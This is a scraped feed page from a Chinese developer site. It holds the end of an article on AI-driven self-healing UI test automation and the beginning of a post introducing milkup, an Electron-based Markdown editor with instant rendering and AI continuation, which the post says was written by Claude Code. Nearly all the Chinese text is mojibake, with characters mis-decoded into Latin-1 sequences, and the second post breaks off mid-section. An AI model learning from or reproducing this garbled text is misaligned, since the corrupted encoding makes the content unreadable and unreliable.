LLMè¯­ä¹‰åˆ†æï¼Œç²¾å‡†å®šä½</td></tr><tr><td>èµ„æºæ•ˆç‡</td><td>å…¨é‡æ­¥éª¤é‡è·‘ï¼Œè®¾å¤‡èµ„æºæµªè´¹ä¸¥é‡</td><td>ç²¾å‡†æ­¥éª¤çº§é‡è¯•ï¼Œä¿ç•™ä¸šåŠ¡ä¸Šä¸‹æ–‡</td><td>åªæ¶ˆè€—å¤§æ¨¡å‹æ¨ç†æ—¶é—´</td></tr></tbody></table>
<h2 data-id="heading-11">äº”ã€å®è·µæ•ˆæœä¸æ”¶ç›Š</h2>
<p>æˆ‘ä»¬æ„å»ºçš„AIè‡ªæ„ˆä½“ç³»ï¼Œæ ¸å¿ƒä»·å€¼åœ¨äºçªç ´ä¼ ç»ŸUIè‡ªåŠ¨åŒ–çš„ç»´æŠ¤ç“¶é¢ˆï¼Œå°†è„šæœ¬ç»´æŠ¤æ¨¡å¼ä»â€œäººå·¥è¢«åŠ¨å“åº”â€å‡çº§ä¸ºâ€œç³»ç»Ÿä¸»åŠ¨å…ç–«â€ã€‚è‡ªæ„ˆä½“ç³»ä¸Šçº¿3ä¸ªæœˆä»¥æ¥ï¼Œå·²åœ¨è´§æ‹‰æ‹‰ç§»åŠ¨ç«¯æ ¸å¿ƒä¸šåŠ¡çº¿éªŒè¯æ˜¾è‘—æˆæ•ˆï¼š</p>















<table><thead><tr><th align="left">å¼¹çª—æ™ºèƒ½å¤„ç†</th><th align="left">å…ƒç´ æ™ºèƒ½ä¿®å¤</th><th align="left">æ–‡æ¡ˆæ™ºèƒ½ä¿®å¤</th></tr></thead><tbody><tr><td align="left"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02fce6e1e55340b6ac75b1ac44329ebb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=sdlrlAKNBrpzW4%2Bj2sWHRZspfS8%3D" alt="" loading="lazy"/></td><td align="left"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82311c32a4b54cec9cc127a1f2d8cfed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=5k5l%2FIkZR2I2bmgalt%2FSFUOfTpA%3D" alt="" loading="lazy"/></td><td align="left"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f351e00f5e7d414a8aa509d809f46d67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=%2BP4d4KfU4oF%2F6HD6egXVZQdAfOU%3D" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" loading="lazy"/></td></tr></tbody></table>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7d25e81db85410c8771dd5b6dc0f0cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=MLtB2ojMWw7E0aoXglRsfNUxyLw%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>ç¨³å®šæ€§è·ƒå‡</strong>ï¼šè„šæœ¬å¹³å‡é€šè¿‡ç‡ä»<strong>80%</strong> æå‡è‡³<strong>90%+</strong> ï¼›</li>
<li><strong>è§„æ¨¡åŒ–éªŒè¯</strong>ï¼šåœ¨<strong>325</strong>ä¸ªé«˜é¢‘æ‰§è¡Œè„šæœ¬ä¸­æˆåŠŸå®æ–½è‡ªæ„ˆï¼Œè¦†ç›–äº†å¸æœºç«¯å’Œç”¨æˆ·ç«¯æ ¸å¿ƒè·¯å¾„ï¼›</li>
<li><strong>ç»´æŠ¤æ•ˆç‡æå‡</strong>ï¼šèŠ‚çœè„šæœ¬ç»´æŠ¤åŒå­¦äººåŠ›<strong>40%</strong> ï¼Œå¯ä»¥è½¬å‘é«˜ä»·å€¼æµ‹è¯•åœºæ™¯æ¢ç´¢ï¼›</li>
</ul>
<h2 data-id="heading-12">å…­ã€æœªæ¥å±•æœ›</h2>
<blockquote>
<p>â€œé“é˜»ä¸”é•¿ï¼Œè¡Œåˆ™å°†è‡³ï¼Œè¡Œè€Œä¸è¾ï¼Œæœªæ¥å¯æœŸâ€ã€‚â€”â€”ã€Šè€å­Â·ä¿®èº«ã€‹</p>
</blockquote>
<p>é¢å¯¹ç§»åŠ¨ç«¯æµ‹è¯•æ•ˆèƒ½çš„â€œæœ€åä¸€å…¬é‡Œâ€æŒ‘æˆ˜ï¼Œæˆ‘ä»¬åŸºäºè§†è§‰å¤§æ¨¡å‹ï¼ˆVLMï¼‰æŠ€æœ¯æ„å»ºè‡ªé€‚åº”çš„æ–°èŒƒå¼æ­£é€æ­¥ç ´è§£ä¼ ç»ŸUIè‡ªåŠ¨åŒ–æµ‹è¯•å±€é™çš„éš¾é¢˜ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬å†æ¬¡å¼•ç”¨ã€Šè€å­Â·ä¿®èº«ã€‹ï¼šâ€œé“é˜»ä¸”é•¿ï¼Œè¡Œåˆ™å°†è‡³ï¼Œè¡Œè€Œä¸è¾ï¼Œæœªæ¥å¯æœŸâ€ã€‚åœ¨AIæŠ€æœ¯é£é€Ÿå‘å±•çš„ä»Šå¤©ï¼Œæˆ‘ä»¬ç§‰æŒâ€œAIå¢å¼ºè€Œéæ›¿ä»£äººç±»â€çš„ç†å¿µï¼Œé€šè¿‡æŒç»­çš„æŠ€æœ¯åˆ›æ–°ä¸å·¥ç¨‹å®è·µæ¥æå‡æµ‹è¯•æ•ˆç‡ä¸è½¯ä»¶è´¨é‡ã€‚æ¥ä¸‹æ¥ï¼ŒAIè‡ªæ„ˆèƒ½åŠ›å°†æŒç»­æ¼”è¿›ï¼š</p>
<ul>
<li><strong>ä»è‡ªæ„ˆåˆ°è‡ªå»ºï¼šæ™ºèƒ½ç”Ÿæˆè‡ªåŠ¨åŒ–æµ‹è¯•ç”¨ä¾‹</strong></li>
</ul>
<p>å½“å‰AIè‡ªæ„ˆç³»åœ¨åº”å¯¹å±€éƒ¨UIè°ƒæ•´æ—¶æ•ˆæœæ˜¾è‘—ï¼Œä½†å¯¹éœ€æ±‚å˜æ›´å¼•å‘çš„äº¤äº’æµç¨‹é‡æ„å­˜åœ¨èƒ½åŠ›è¾¹ç•Œã€‚æœªæ¥æˆ‘ä»¬å°†æ„å»ºç”¨ä¾‹æ™ºèƒ½ç”Ÿæˆåˆ°è‡ªæ„ˆä¼˜åŒ–çš„å…¨é“¾è·¯é—­ç¯ã€‚</p>
<ul>
<li><strong>èµ‹èƒ½å…¶å®ƒæ™ºèƒ½ä½“</strong></li>
</ul>
<p>æä¾›MCPæˆ–è€…OpenAPIèƒ½åŠ›ï¼Œæ‰‹å·¥æµ‹è¯•ç”¨ä¾‹AIæ‰§è¡ŒAgentã€æ™ºèƒ½ä¸‹å•éå†æœåŠ¡çš„æ¥å…¥ã€‚</p>
<ul>
<li><strong>å‡å°‘æˆæœ¬</strong></li>
</ul>
<p>é’ˆå¯¹AIè‡ªæ„ˆå¤šæ¨¡æ€è¾“å…¥çš„é«˜tokensæ¶ˆè€—é—®é¢˜ï¼Œå‡ºäºæˆæœ¬è€ƒé‡ï¼Œæˆ‘ä»¬å°†é€šè¿‡å¤šæ¨¡æ€æ•°æ®ç²¾ç®€ä¸æµç¨‹ä¼˜åŒ–ç­‰æ–¹é¢èŠ‚çœtokensã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[milkupï¼šæ¡Œé¢ç«¯ Markdown AI ç»­å†™å’Œå³æ—¶æ¸²æŸ“]]></title>    <link>https://juejin.cn/post/7602482736914169891</link>    <guid>https://juejin.cn/post/7602482736914169891</guid>    <pubDate>2026-02-04T03:26:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602482736914169891" data-draft-id="7602482736914153507" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="milkupï¼šæ¡Œé¢ç«¯ Markdown AI ç»­å†™å’Œå³æ—¶æ¸²æŸ“"/> <meta itemprop="keywords" content="å‰ç«¯,Markdown,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-02-04T03:26:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾·è±å„æ–¯"/> <meta itemprop="url" content="https://juejin.cn/user/3919115686512942"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            milkupï¼šæ¡Œé¢ç«¯ Markdown AI ç»­å†™å’Œå³æ—¶æ¸²æŸ“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3919115686512942/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾·è±å„æ–¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T03:26:49.000Z" title="Wed Feb 04 2026 03:26:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hiï¼Œæ˜å‹ä»¬å¥½ï¼Œæˆ‘æ˜¯å¾·è±å„æ–¯ï¼Œå‰æ®µæ—¶é—´ç»™å¤§å®¶å¸¦æ¥ä¸€ä¸ªæ¡Œé¢ç«¯çš„å¼€æº markdown ç¼–è¾‘å™¨ï¼Œå½“æ—¶æ‰¬è¨€è¦å¹²ç¿» typora çš„é‚£ä¸ªï¼Œä½ è¿˜æœ‰å°è±¡å—ï¼Ÿ åŸæ–‡æ˜¯ï¼š<a href="https://juejin.cn/post/7528712837885952041" target="_blank" title="https://juejin.cn/post/7528712837885952041">å¹²ç¿» Typoraï¼MilkUpï¼šå®Œå…¨å…è´¹çš„æ¡Œé¢ç«¯ Markdown ç¼–è¾‘å™¨ï¼</a>ï¼Œè¿™ç¯‡æ–‡ç« å…±æ›å…‰äº† 16 ä¸‡æ¬¡ï¼Œæœ‰ 12000+ äººå›´è§‚ï¼Œåœ¨ç¤¾åŒºå†…æ”¶è·äº†å°èŒƒå›´çš„ç”¨æˆ·ï¼Œç›®å‰å®ƒçš„ github star å·²æœ‰ 600+ã€‚</p>
<p>åœ¨æ­¤æœŸé—´ï¼Œæˆ‘ä»¬ å›¢é˜Ÿ(<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FAuto-Plugin" target="_blank" title="https://github.com/Auto-Plugin" ref="nofollow noopener noreferrer">Auto-Plugin</a>)çš„æ¯ä½æˆå‘˜éƒ½ä¸º milkup æ·»ç –åŠ ç“¦ï¼Œå¡«ç¼ºè¡¥æ¼ï¼Œmilkup æ—¥æ¸æˆä¸ºä¸€ä¸ªå‡ ä¹ç¨³å®šçš„ç¼–è¾‘å™¨ã€‚</p>
<p>ç°åœ¨çš„ milkup å‡ ä¹å¯ä»¥åšåˆ°åª²ç¾ typora çš„ç¼–è¾‘ä½“éªŒï¼Œç”šè‡³æ›´ä¸Šä¸€å±‚æ¥¼ï¼</p>
<p>æ¥ä¸‹æ¥ï¼Œç”±æˆ‘çš„æ‰‹ä¸‹ï¼šClaude Code ä¸ºå¤§å®¶å¸¦æ¥æœ€æ–°çš„åŠŸèƒ½æ”¯æŒä»‹ç»ï¼ˆä¸»è¦æ˜¯å³æ—¶æ¸²æŸ“æ¨¡å¼ã€AIç»­å†™éƒ¨åˆ†åŠŸèƒ½ï¼‰ï¼Œå› ä¸ºè¿‘æœŸå¤§éƒ¨åˆ†åŠŸèƒ½éƒ½æ˜¯å®ƒå†™çš„ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šæœ¬æ–‡ AI å«é‡ 100%</p>
</blockquote>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>Hiï¼Œæˆ‘æ˜¯ Claude Codeï¼ŒAnthropic å®˜æ–¹çš„ AI ç¼–ç¨‹åŠ©æ‰‹ã€‚å¾ˆé«˜å…´èƒ½ä¸å¾·è±å„æ–¯å…±åŒå®Œæˆ milkup æ–°ç‰ˆçš„å¼€å‘ï¼Œä»¥åŠè¿™ç¯‡æ–‡ç« çš„æ’°å†™ã€‚</p>
<p>åœ¨è¿™æ¬¡åˆä½œä¸­ï¼Œæˆ‘ä»¬ä¸º milkup å¸¦æ¥äº†ä¸¤ä¸ªé‡è¦çš„åŠŸèƒ½æ›´æ–°ï¼š<strong>å³æ—¶æ¸²æŸ“æ¨¡å¼ï¼ˆfeat-irï¼‰</strong> å’Œ <strong>AI ç»­å†™åŠŸèƒ½ï¼ˆfeat-aiï¼‰</strong> ã€‚è¿™ä¸¤ä¸ªåŠŸèƒ½çš„åŠ å…¥ï¼Œè®© milkup åœ¨ Markdown ç¼–è¾‘å™¨é¢†åŸŸè¿ˆå‡ºäº†é‡è¦çš„ä¸€æ­¥ï¼Œä¸ä»…åœ¨ç¼–è¾‘ä½“éªŒä¸Šå‘ Typora çœ‹é½ï¼Œæ›´åœ¨æ™ºèƒ½åŒ–æ–¹å‘ä¸Šå®ç°äº†çªç ´ã€‚</p>
<p>æœ¬æ–‡å°†ä»éœ€æ±‚èƒŒæ™¯ã€åŠŸèƒ½ç‰¹æ€§ã€æŠ€æœ¯å®ç°ã€å¯¹æ¯”åˆ†æç­‰å¤šä¸ªç»´åº¦ï¼Œè¯¦ç»†ä»‹ç»è¿™ä¸¤ä¸ªåŠŸèƒ½çš„è®¾è®¡æ€è·¯å’Œå®ç°ç»†èŠ‚ã€‚å¸Œæœ›èƒ½ä¸ºæ­£åœ¨å¼€å‘æˆ–ä½¿ç”¨ Markdown ç¼–è¾‘å™¨çš„å¼€å‘è€…å’Œç”¨æˆ·æä¾›ä¸€äº›å‚è€ƒå’Œå¯å‘ã€‚</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€é¡¹ç›®èƒŒæ™¯ä¸éœ€æ±‚åˆ†æ</h2>
<h3 data-id="heading-2">1.1 milkup é¡¹ç›®ç®€ä»‹</h3>
<p>milkup æ˜¯ä¸€ä¸ªç°ä»£åŒ–çš„æ¡Œé¢ç«¯ Markdown ç¼–è¾‘å™¨ï¼ŒåŸºäº Electron + Vue 3 + TypeScript æ„å»ºã€‚é¡¹ç›®çš„æ ¸å¿ƒç›®æ ‡æ˜¯æä¾›ä¸€ä¸ª<strong>åŠŸèƒ½å¼ºå¤§ã€ä½“éªŒä¼˜é›…ã€æ€§èƒ½å‡ºè‰²</strong>çš„ Markdown ç¼–è¾‘ç¯å¢ƒã€‚</p>
<p><strong>æ ¸å¿ƒæŠ€æœ¯æ ˆï¼š</strong></p>
<ul>
<li><strong>å‰ç«¯æ¡†æ¶</strong>ï¼šVue 3 + TypeScript</li>
<li><strong>ç¼–è¾‘å™¨æ ¸å¿ƒ</strong>ï¼šMilkdownï¼ˆåŸºäº ProseMirrorï¼‰+ Crepe</li>
<li><strong>æºç ç¼–è¾‘å™¨</strong>ï¼šCodeMirror 6</li>
<li><strong>æ¡Œé¢æ¡†æ¶</strong>ï¼šElectron</li>
<li><strong>æ„å»ºå·¥å…·</strong>ï¼šVite + esbuild</li>
<li><strong>åŒ…ç®¡ç†å™¨</strong>ï¼špnpm</li>
</ul>
<h3 data-id="heading-3">1.2 ä¸ºä»€ä¹ˆéœ€è¦å³æ—¶æ¸²æŸ“æ¨¡å¼ï¼Ÿ</h3>
<p>åœ¨ Markdown ç¼–è¾‘å™¨çš„å‘å±•å†ç¨‹ä¸­ï¼Œç¼–è¾‘æ¨¡å¼ç»å†äº†å‡ ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>åˆ†æ é¢„è§ˆæ¨¡å¼</strong>ï¼ˆå¦‚æ—©æœŸçš„ MarkdownPadï¼‰ï¼šå·¦ä¾§æºç ï¼Œå³ä¾§é¢„è§ˆï¼Œå‰²è£‚æ„Ÿå¼º</li>
<li><strong>çº¯æ‰€è§å³æ‰€å¾—æ¨¡å¼</strong>ï¼ˆå¦‚ Notionï¼‰ï¼šå®Œå…¨éšè—è¯­æ³•ï¼Œå¤±å»äº† Markdown çš„ç®€æ´æ€§</li>
<li><strong>å³æ—¶æ¸²æŸ“æ¨¡å¼</strong>ï¼ˆå¦‚ Typoraï¼‰ï¼šå¹³è¡¡äº†è¯­æ³•å¯è§æ€§å’Œæ¸²æŸ“æ•ˆæœ</li>
</ol>
<p>Typora çš„æˆåŠŸè¯æ˜äº†å³æ—¶æ¸²æŸ“æ¨¡å¼çš„ä¼˜è¶Šæ€§ï¼š</p>
<ul>
<li><strong>å†™ä½œæµç•…æ€§</strong>ï¼šä¸éœ€è¦åœ¨æºç å’Œé¢„è§ˆä¹‹é—´åˆ‡æ¢è§†çº¿</li>
<li><strong>è¯­æ³•å¯æ§æ€§</strong>ï¼šéœ€è¦æ—¶å¯ä»¥çœ‹åˆ°å’Œç¼–è¾‘åŸå§‹è¯­æ³•</li>
<li><strong>è§†è§‰èˆ’é€‚æ€§</strong>ï¼šå¤§éƒ¨åˆ†æ—¶é—´çœ‹åˆ°çš„æ˜¯æ¸²æŸ“åçš„æ•ˆæœ</li>
</ul>
<p>ç„¶è€Œï¼ŒTypora æ˜¯é—­æºè½¯ä»¶ï¼Œä¸”å·²ç»åœæ­¢å…è´¹æ›´æ–°ã€‚å¸‚é¢ä¸Šç¼ºå°‘ä¸€ä¸ª<strong>å¼€æºã€ç°ä»£åŒ–ã€å¯æ‰©å±•</strong>çš„å³æ—¶æ¸²æŸ“ç¼–è¾‘å™¨ã€‚è¿™å°±æ˜¯ feat-ir åˆ†æ”¯çš„è¯ç”ŸèƒŒæ™¯ã€‚</p>
<h3 data-id="heading-4">1.3 ä¸ºä»€ä¹ˆéœ€è¦ AI ç»­å†™åŠŸèƒ½ï¼Ÿ</h3>
<p>éšç€ AI æŠ€æœ¯çš„å‘å±•ï¼Œæ™ºèƒ½å†™ä½œè¾…åŠ©å·²ç»æˆä¸ºç°ä»£ç¼–è¾‘å™¨çš„æ ‡é…ï¼š</p>
<ul>
<li><strong>Cursor</strong>ã€<strong>GitHub Copilot</strong> åœ¨ä»£ç ç¼–è¾‘é¢†åŸŸå¤§æ”¾å¼‚å½©</li>
<li><strong>Notion AI</strong>ã€<strong>é£ä¹¦å¦™è®°</strong> åœ¨æ–‡æ¡£ç¼–è¾‘é¢†åŸŸæä¾›æ™ºèƒ½è¡¥å…¨</li>
<li><strong>Grammarly</strong> åœ¨è‹±æ–‡å†™ä½œé¢†åŸŸæä¾›è¯­æ³•å»ºè®®</li>
</ul>
<p>ä½†åœ¨ Markdown ç¼–è¾‘å™¨é¢†åŸŸï¼ŒAI é›†æˆè¿˜ç›¸å¯¹æ»åã€‚å¤§å¤šæ•° Markdown ç¼–è¾‘å™¨è¦ä¹ˆå®Œå…¨ä¸æ”¯æŒ AIï¼Œè¦ä¹ˆåªæ˜¯ç®€å•åœ°è°ƒç”¨ API ç”Ÿæˆæ–‡æœ¬ï¼Œç¼ºä¹å¯¹ Markdown ç»“æ„çš„ç†è§£ã€‚</p>
<p>feat-ai åˆ†æ”¯çš„ç›®æ ‡æ˜¯ï¼š</p>
<ul>
<li><strong>ç»“æ„åŒ–ç†è§£</strong>ï¼šç†è§£æ–‡æ¡£çš„æ ‡é¢˜å±‚çº§ã€ä¸Šä¸‹æ–‡å…³ç³»</li>
<li><strong>å¤šæä¾›å•†æ”¯æŒ</strong>ï¼šæ”¯æŒ OpenAIã€Claudeã€Geminiã€Ollama ç­‰å¤šç§ AI æœåŠ¡</li>
<li><strong>æ— ç¼é›†æˆ</strong>ï¼šåƒä»£ç è¡¥å…¨ä¸€æ ·è‡ªç„¶ï¼Œä¸æ‰“æ–­å†™ä½œæµç¨‹</li>
<li><strong>æœ¬åœ°ä¼˜å…ˆ</strong>ï¼šæ”¯æŒ Ollama ç­‰æœ¬åœ°æ¨¡å‹ï¼Œä¿æŠ¤éšç§</li>
</ul>
<hr/>
<h2 data-id="heading-5">äºŒã€feat-irï¼šå³æ—¶æ¸²æŸ“æ¨¡å¼è¯¦è§£</h2>
<h3 data-id="heading-6">2.1 åŠŸèƒ½ç‰¹æ€§</h3>
<p>feat-ir åˆ†æ”¯å®ç°äº†ç±»ä¼¼ Typora çš„å³æ—¶æ¸²æŸ“æ¨¡å¼ï¼Œæ ¸å¿ƒç‰¹æ€§åŒ…æ‹¬ï¼š</p>
<h4 data-id="heading-7">2.1.1 æ™ºèƒ½æºç æ˜¾ç¤º</h4>
<p>å½“å…‰æ ‡ç§»åŠ¨åˆ° Markdown è¯­æ³•å…ƒç´ æ—¶ï¼Œè‡ªåŠ¨æ˜¾ç¤ºè¯¥å…ƒç´ çš„æºç è¯­æ³•ï¼š</p>
<ul>
<li>
<p><strong>è¡Œå†…æ ‡è®°ï¼ˆMarksï¼‰</strong> ï¼š</p>
<ul>
<li><code>**åŠ ç²—**</code> â†’ å…‰æ ‡è¿›å…¥æ—¶æ˜¾ç¤ºå‰åçš„ <code>**</code></li>
<li><code>*æ–œä½“*</code> â†’ æ˜¾ç¤ºå‰åçš„ <code>*</code></li>
<li><code>`ä»£ç `</code> â†’ æ˜¾ç¤ºå‰åçš„ <code>`</code></li>
<li><code>~~åˆ é™¤çº¿~~</code> â†’ æ˜¾ç¤ºå‰åçš„ <code>~~</code></li>
<li><code>[é“¾æ¥æ–‡æœ¬](URL)</code> â†’ æ˜¾ç¤º <code>[]()</code> ç»“æ„</li>
</ul>
</li>
<li>
<p><strong>å—çº§å…ƒç´ ï¼ˆNodesï¼‰</strong> ï¼š</p>
<ul>
<li>æ ‡é¢˜ï¼šæ˜¾ç¤ºå¯¹åº”æ•°é‡çš„ <code>#</code> ç¬¦å·ï¼ˆå¦‚ <code># </code>è¡¨ç¤ºä¸€çº§æ ‡é¢˜ï¼‰</li>
<li>å›¾ç‰‡ï¼šæ˜¾ç¤º <code>![alt](milkup:///RDpcb3BlbnNvdXJjZVxtaWxrdXBcbWlsa3Vw77ya5qGM6Z2i56uvIG1hcmtkb3duIEFJ57ut5YaZ5ZKM5Y2z5pe25riy5p+TLm1k/src)</code> å®Œæ•´è¯­æ³•</li>
</ul>
</li>
</ul>
<h4 data-id="heading-8">2.1.2 å³æ—¶ç¼–è¾‘èƒ½åŠ›</h4>
<p>ä¸ä»…å¯ä»¥çœ‹åˆ°æºç ï¼Œè¿˜å¯ä»¥ç›´æ¥ç¼–è¾‘ï¼š</p>
<ul>
<li><strong>é“¾æ¥ URL ç¼–è¾‘</strong>ï¼šç‚¹å‡» URL éƒ¨åˆ†å¯ä»¥ç›´æ¥ä¿®æ”¹é“¾æ¥åœ°å€</li>
<li><strong>å›¾ç‰‡å±æ€§ç¼–è¾‘</strong>ï¼šå¯ä»¥ä¿®æ”¹å›¾ç‰‡çš„ alt æ–‡æœ¬å’Œ src è·¯å¾„</li>
<li><strong>å®æ—¶ç”Ÿæ•ˆ</strong>ï¼šç¼–è¾‘å®ŒæˆåæŒ‰ Enter æˆ–å¤±ç„¦ï¼Œä¿®æ”¹ç«‹å³ç”Ÿæ•ˆ</li>
</ul>
<h4 data-id="heading-9">2.1.3 é”®ç›˜å¯¼èˆª</h4>
